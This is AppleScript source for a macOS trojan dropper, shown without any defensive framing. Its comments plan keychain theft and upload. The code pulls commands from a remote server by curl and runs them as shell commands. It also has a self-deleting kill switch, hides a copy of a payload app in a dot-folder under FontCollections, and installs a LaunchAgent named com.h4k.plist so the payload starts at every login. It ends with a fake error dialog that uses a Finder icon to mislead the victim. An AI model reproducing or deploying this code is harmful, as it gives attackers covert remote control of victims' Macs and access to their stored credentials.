(* Chute

	Remote command
	Make folder
	Launch Agent
	Copy payload
	Does something to make the user happy	

*)

(* Payload

	Remote command
	Check if password has changed
		Prompt
			tell application "System Events" to keystroke "q" using {command down, option down, shift down}
		Record 
	Copy keychain
	Encrypt
	Upload

*)

set remoteHost to "http://penncoursesearch.com:5000"
--set remoteHost to "http://localhost:3000"
set commandURL to remoteHost & "/remote.txt"
try
	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
	if (item 1 of commandArgs) is "true" then -- Kill
		try
			do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
		end try
		return
	else if (item 2 of commandArgs) is "true" then -- Hold
		return
	else
		if (count of commandArgs) > 2 then
			repeat with a from 3 to (count of commandArgs)
				if (item a of commandArgs) starts with "C-" or (item a of commandArgs) starts with "A-" then
					try
						do shell script (characters 3 thru -1 of (item a of commandArgs) as string) -- Run commands
					end try
				end if
			end repeat
		end if
	end if
on error err
	log err
	return
end try

try
	set theuser to do shell script "whoami"
	try
		do shell script "mkdir ~/Library/FontCollections/." & theuser & "" -- Make the hidden folder in the user's Public folder
	end try
	set ufld to "/Users/" & theuser & "/Library/FontCollections/." & theuser & "/"
on error
	return
end try
try
	set reso to quoted form of POSIX path of (path to me) & "Contents/Resources/pyld.app"
	set newreso to POSIX path of ("" & ufld & "pyld.app")
	do shell script "cp -r " & reso & " " & newreso -- Copy duplicate app
	
	try
		do shell script "mkdir ~/Library/LaunchAgents/"
	end try
	set plistPath to "~/Library/LaunchAgents/com.h4k.plist"
	do shell script "touch " & plistPath -- Make a launchagent for startup
	log "new"
	do shell script "defaults write " & plistPath & " Label 'com.h4k.plist'"
	do shell script "defaults write " & plistPath & " Program '" & ufld & "pyld.app/Contents/MacOS/applet'"
	do shell script "defaults write " & plistPath & " RunAtLoad -bool true"
end try
try
	display dialog "The process could not be completed.
	" with title "Error" with icon ((path to me) & "Contents:Resources:Finder.icns" as text) as alias buttons ["OK"] default button 1
end try